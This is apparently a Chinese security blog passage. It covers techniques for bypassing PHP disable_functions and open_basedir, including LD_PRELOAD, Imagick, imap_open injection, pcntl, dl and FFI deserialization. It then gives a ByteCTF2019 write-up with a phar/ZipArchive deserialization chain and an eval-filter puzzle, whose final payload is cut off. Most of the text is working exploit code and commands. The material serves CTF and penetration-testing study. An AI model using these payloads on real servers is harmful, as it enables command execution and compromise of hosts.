<p><strong>它是在加载共享库时运行的，通常是在程序启动过程中</strong>，也就是当有一个新进程/子进程启动时，那么__attribute__((constructor))就会被直接加载，我们上面的mail等函数也正好符合这个特性，下面也接着来试一下</p>
<p>hack.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">angel</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    system(<span class="string">"ls"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>hack.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=./hack.so"</span>);</span><br><span class="line">error_log(<span class="string">''</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>运行，即可列目录</p>
<p>具有这种开一个新进程/子进程的函数还有其他的，比如imagick同样可以</p>
<p>test.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$img = <span class="keyword">new</span> Imagick(<span class="string">'test.wmv'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>新建一个test.wmv</p>
<p>看一下调用的新进程</p>
<p><img src="https://s2.ax1x.com/2019/10/04/uB7xot.png" alt="uB7xot.png"></p>
<p>从上面可以看出这里取调用了新进程ffmpeg进行处理</p>
<p>调用ffmpeg的还有以下几种后缀</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmv,mov,m4v,m2v,mp4,mpg,mpeg,mkv,avi,3g2,3gp</span><br></pre></td></tr></table></figure>

<p>引入恶意so进行一下实验</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@4c80e397e0b2:/<span class="comment"># php test.php</span></span><br><span class="line">bin   etc   hack.c   lib    mnt   readflag    run   sys       tmp</span><br><span class="line">boot  flag  hack.so  lib64  opt   readflag.c  sbin  test.php  usr</span><br><span class="line">dev   hack  home     media  proc  root        srv   test.wmv  var</span><br><span class="line">PHP Fatal error:  Uncaught ImagickException: unable to open image `/tmp/magick-709mqrbus4dKcZ0.pam<span class="string">': No such file or directory @ error/blob.c/OpenBlob/2701 in /test.php:3</span></span><br><span class="line"><span class="string">Stack trace:</span></span><br><span class="line"><span class="string">#0 /test.php(3): Imagick-&gt;__construct('</span>test.wmv<span class="string">')</span></span><br><span class="line"><span class="string">#1 &#123;main&#125;</span></span><br><span class="line"><span class="string">  thrown in /test.php on line 3</span></span><br></pre></td></tr></table></figure>

<p>可以看到成功列了目录</p>
<p>当然，其他后缀是可以调用其他的新进程</p>
<p>从kylingit这位师傅博客可以看到部分列举出来的常见调用依赖</p>
<table>
<thead>
<tr>
<th>EPI/EPS/PDF/PS</th>
<th><a href="http://www.cs.wisc.edu/~ghost" target="_blank" rel="noopener">Ghostscript</a></th>
</tr>
</thead>
<tbody><tr>
<td>MNG/M2V</td>
<td><a href="https://www.ffmpeg.org/download.html" target="_blank" rel="noopener">ffmpeg</a></td>
</tr>
<tr>
<td>JXR</td>
<td><a href="https://jxrlib.codeplex.com/" target="_blank" rel="noopener">jxrlib</a></td>
</tr>
</tbody></table>
<p>更详细的可以直接参考一下官网<a href="https://imagemagick.org/script/formats.php" target="_blank" rel="noopener">https://imagemagick.org/script/formats.php</a></p>
<p>下面以PDF为例验证</p>
<p><img src="https://s2.ax1x.com/2019/10/04/uD9rn0.png" alt="uD9rn0.png"></p>
<p>这里的imagick似乎是是有一个禁止调用的名单，这里写的是gs的禁止调用名单，需要把none改为read|write,接下来的程序正常进行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$img = <span class="keyword">new</span> Imagick(<span class="string">'test.pdf'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/04/uDmFeJ.png" alt="uDmFeJ.png"></p>
<p>成功进行命令执行。</p>
<p>可以用strace具体看一下调用进程</p>
<p><img src="https://s2.ax1x.com/2019/10/04/urkE4K.png" alt="urkE4K.png"></p>
<p>从上图可以明显的看到在处理pdf后缀的时候会调用ghostscript，这样就满足了新进程，从而加载了我们__attribute__ ((__constructor__))部分</p>
<h4 id="利用imap-open"><a href="#利用imap-open" class="headerlink" title="利用imap_open"></a>利用imap_open</h4><p>这个东西之前也写过，直接放下poc和以前的文章链接好了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">`<span class="meta">&lt;?php</span>$server = <span class="string">"any -o ProxyCommand=echo\t'\&lt;?php\tsystem(whoami);?&gt;'\t&gt;\t1.php"</span>;@imap_open(<span class="string">'&#123;'</span>.$server.<span class="string">'&#125;:143/imap&#125;INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>);`</span><br></pre></td></tr></table></figure>

<p>一般利用imap进行bypass是没有回显的，所以一般把回显的结果写入文章内容</p>
<p>文章链接</p>
<p><a href="https://lihuaiqiu.github.io/2019/06/01/PHP邮件漏洞小结/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/06/01/PHP%E9%82%AE%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/</a></p>
<h4 id="pcntl插件-bypass"><a href="#pcntl插件-bypass" class="headerlink" title="pcntl插件 bypass"></a>pcntl插件 bypass</h4><p>载安装pcntl插件的情况下，可以通过pcntl进行bypass。</p>
<p>如果在查看phpinfo()种看到enable-pcntl，并且在disable_functions允许的情况下，可以通过下面poc bypass</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#exec.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> pcntl_exec(<span class="string">"/bin/bash"</span>, <span class="keyword">array</span>(<span class="string">"/tmp/b4dboy.sh"</span>));&gt;</span><br><span class="line"><span class="comment">#/tmp/b4dboy.sh#!/bin/bash</span></span><br><span class="line">ls -l /</span><br></pre></td></tr></table></figure>

<h4 id="外部扩展库dl-bypass"><a href="#外部扩展库dl-bypass" class="headerlink" title="外部扩展库dl bypass"></a>外部扩展库dl bypass</h4><p>dl扩展库的详细安装过程</p>
<p><a href="http://reverse-tcp.xyz/php/pentest/2016/12/22/php-disabled_functions-bypass.html" target="_blank" rel="noopener">http://reverse-tcp.xyz/php/pentest/2016/12/22/php-disabled_functions-bypass.html</a></p>
<p>dl bypass-poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">dl(<span class="string">"dl.so"</span>);  <span class="comment">//dl.so在extension_dir目录，如不在则用../../来实现调用</span></span><br><span class="line">confirm_dl_compiled(<span class="string">"$_GET[a]&gt;;1.txt"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>主要就是dl.so这个文件的搜索，通过调用dl.so进行命令执行。</p>
<h4 id="PHP7-4-FFI-bypass"><a href="#PHP7-4-FFI-bypass" class="headerlink" title="PHP7.4-FFI bypass"></a>PHP7.4-FFI bypass</h4><p>在RCTF2019中出的题，考察了php7.4的新特性，通过新加的FFI即可bypass disable function</p>
<p>preload代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">    array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>官方给的调用形式如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// create FFI object, loading libc and exporting function printf()</span></span><br><span class="line">$ffi = FFI::cdef(</span><br><span class="line">    <span class="string">"int printf(const char *format, ...);"</span>, <span class="comment">// this is a regular C declaration</span></span><br><span class="line">    <span class="string">"libc.so.6"</span>);</span><br><span class="line"><span class="comment">// call C's printf()</span></span><br><span class="line">$ffi-&gt;printf(<span class="string">"Hello %s!\n"</span>, <span class="string">"world"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>对于FFI::cdef中第二个参数不进行传参也可以，并且在php7.4中我们我们可以通过__unserialize和<em>\</em>serialize来控制自定义对象的序列化</p>
<p>最终poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'FFI::cdef'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'int system(char *command);'</span></span><br><span class="line">    ];</span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(serialize(<span class="keyword">new</span> A()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a&#x3D;unserialize(&#39;C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;&#39;);$a-&gt;ret-&gt;system(&#39;curl xx&#39;);</span><br></pre></td></tr></table></figure>

<p>调用流程：反序列化触发__unserialize，通过调用不存在的变量名ret触发__get，最后进行FFI命令执行</p>
<h3 id="Bypass-open-basedir"><a href="#Bypass-open-basedir" class="headerlink" title="Bypass open_basedir"></a>Bypass open_basedir</h3><h4 id="chdir-bypass"><a href="#chdir-bypass" class="headerlink" title="chdir bypass"></a>chdir bypass</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mkdir(<span class="string">'/tmp/test'</span>);chdir(<span class="string">'/tmp/test/'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);var_dump(file_get_contents(<span class="string">"/flag"</span>));</span><br></pre></td></tr></table></figure>

<h4 id="glob-bypass"><a href="#glob-bypass" class="headerlink" title="glob bypass"></a>glob bypass</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">printf(<span class="string">'&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;'</span>, ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">$file_list = <span class="keyword">array</span>();</span><br><span class="line"><span class="comment">// normal files</span></span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// special files (starting with a dot(.))</span></span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///.*"</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line">sort($file_list);</span><br><span class="line"><span class="keyword">foreach</span>($file_list <span class="keyword">as</span> $f)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&#123;$f&#125;&lt;br/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面是比较常见的open_basedir bypass，也还有好几种bypass.</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>上面在bypass disabled_functions我少写了一个mod_cgi的bypass，在bypass open_basedir中少写了一个fpm bypass的方法，主要是想这两个方法都很有意思，准备单独拿出来写一下，在以后的文章中会看到他们的身影。</p>
]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>ByteCTF2019</title>
    <url>/2019/10/07/ByteCTF2019/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Bytectf和n1ctf撞了，由于一些原因必须得打n1ctf，打了两天..自闭了两天…到头来，tp5.2反序列化pop链还是没摸到….真难过…</p>
<h3 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h3><p><a href="http://www.zip下载下来主要有四个文件" target="_blank" rel="noopener">www.zip下载下来主要有四个文件</a></p>
<p>需要成为admin才能上传文件，源码发现存在典型的hash长度扩展攻击</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input Signature: 52107b08c0f3342d2153ae1d68e6262c</span><br><span class="line">Input Data: admin</span><br><span class="line">Input Key Length: 13</span><br><span class="line">Input Data to Add: huaiqiu</span><br><span class="line">75c31d8ac465832c745e5e097afb12e5</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00huaiqiu</span><br></pre></td></tr></table></figure>

<p>那就扩展一下</p>
<p>看看剩下的关键代码，主要就是这几个类了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $content = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    $black_list = [<span class="string">'system'</span>,<span class="string">'eval'</span>,<span class="string">'exec'</span>,<span class="string">'+'</span>,<span class="string">'passthru'</span>,<span class="string">'`'</span>,<span class="string">'assert'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($black_list <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($content, $v) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"your file make me scare"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看起来是一个检测文件内容的类，一个毫无作用的check函数.</p>
<p>之后的也是比较明显的的Phar触发点，和一些常规功能点，也就不在赘述了，先说一下自己最开始的思路：</p>
<p>Admin类中的upload函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_file</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'u r not admin'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;content_check -&gt; check();</span><br><span class="line">    $tmp = explode(<span class="string">"."</span>, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    $ext = end($tmp);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;size &gt; <span class="number">204800</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"your file is too big"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file(<span class="keyword">$this</span>-&gt;file_tmp, <span class="keyword">$this</span>-&gt;upload_dir.<span class="string">'/'</span>.md5(<span class="keyword">$this</span>-&gt;filename).<span class="string">'.'</span>.$ext);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为这道题会自动在你要上传文件的目录放一个导致你500的htaccess，那么解决的办法只有两个，第一个就是换个目录传，第二个目录是删掉htaccess</p>
<p>我开始研究的是第一个思路，我康upload_file中这个$this-&gt;upload_dir是可以更改的，那我在反序列化时候改一下它的值不就行了？之后大概看了一下upload.php，发现这个思路应该不行，关键代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$file_tmp = $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">$file_name = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">$file_size = $_FILES[<span class="string">'file'</span>][<span class="string">'size'</span>];</span><br><span class="line">$file_error = $_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>];</span><br><span class="line"><span class="keyword">if</span> ($file_error &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"something error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$admin = <span class="keyword">new</span> Admin($file_name, $file_tmp, $file_size);</span><br><span class="line">$admin-&gt;upload_file();</span><br></pre></td></tr></table></figure>

<p>这个是上传文件时主要进行的操作，我们之前的思路是改dir,但是改dir的同时是要配合文件上传的，但是这里每次的文件上传都进行了一次New Admin，我们也可以看到在new的时候触发construct，所以dir并不是由我们决定的，所以只能换下一个思路了。</p>
<p>不放过每一个可疑点真的是很重要的一个思路</p>
<p>问题在于Profile类，下面这个__call并没有什么用处</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;admin-&gt;open(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这应该就是所谓的为了出题而出题吧</p>
<p>那么结合之前的第二个删掉htaccess思路，这里就可能是利用某个类的open函数去删掉htaccess，fuzz一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SessionHandler-&gt;open</span><br><span class="line">ZipArchive-&gt;open</span><br><span class="line">XMLReader-&gt;open</span><br><span class="line">SQLite3-&gt;open</span><br></pre></td></tr></table></figure>

<p>最后可以发现ZipArchive-&gt;open可进行覆盖删除</p>
<p>这个覆盖我也稍微研究了一下，发现也很有趣，进一步思考了一下”覆盖”这两个字的意思</p>
<p>覆盖应该是分为两个过程的</p>
<ul>
<li>首先将已存在的文件删除</li>
<li>将你的覆盖文件放到被删除文件的位置</li>
</ul>
<p>那么这个ZipArchive的open函数不仅可以覆盖zip还可以覆盖其他文件，造成删除</p>
<p>最终exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $checker;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Profile;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;checker))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;upload_file();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $username=<span class="string">'The path of htaccess'</span>;</span><br><span class="line"><span class="keyword">public</span> $password=Zip::OVERWIRTE;</span><br><span class="line"><span class="keyword">public</span> $admin;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;admin=<span class="keyword">new</span> ZipArchive();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;admin-&gt;open(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先上传个php文件，然后传个phar，php://fitler绕过过滤触发phar反序列化，最后访问php文件，拿到shell。</p>
<h3 id="Boring-Code"><a href="#Boring-Code" class="headerlink" title="Boring Code"></a>Boring Code</h3><p>挺有意思的一道题，源码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/data:\/\//i'</span>, $url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们的目的是拿到上层目录的index.php的源码，那么就意味着得跳目录，dirname被ban了，不能那么常规的跳了,但是拿到<code>..</code>就好,这点不难想到scandir扫出来的数组的第二个字符就是..,那么首先就得扫一下当前的目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.. &lt;&#x3D;&gt; next(scandir(&#39;.&#39;))</span><br></pre></td></tr></table></figure>

<p>扫当前的目录的话就是scandir(‘.’)，那么我们就需要拿到.字符，我首先想到的是chr出来，数字的问题的可以通过时间函数去解决，在手册上翻了翻时间的函数，最后找到了满足这个条件的函数localtime()</p>
<p><img src="https://s2.ax1x.com/2019/09/26/um5KsS.png" alt="um5KsS.png"></p>
<p>第一个元素是随着时间而增加的，也就是在每分钟的第四十六秒(current的话可以用pos绕过)，我们就可以拿到.这个字符，那么也就意味着我们拿到了..，但是我们必须要进入上层目录才能去读取那个文件，这个可以用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">chdir(next(scandir(<span class="string">'.'</span>)))</span><br></pre></td></tr></table></figure>

<p>不过这个返回的是个布尔值，那么我们怎么去解决这个问题呢，这里可以用time去接受这个布尔值</p>
<p><img src="https://s2.ax1x.com/2019/09/26/unamy6.png" alt="unamy6.png"></p>
<p>这里可以看到time的参数是void，那么我们无论传什么参数都不会影响函数的执行的，所以这个true用time接收就可以了</p>
<p>然后localtime函数再接受这个time(1)，最终拿到.，再次进行scandir，然后取end函数，通过readfile拿到flag</p>
<p>最终payload</p>
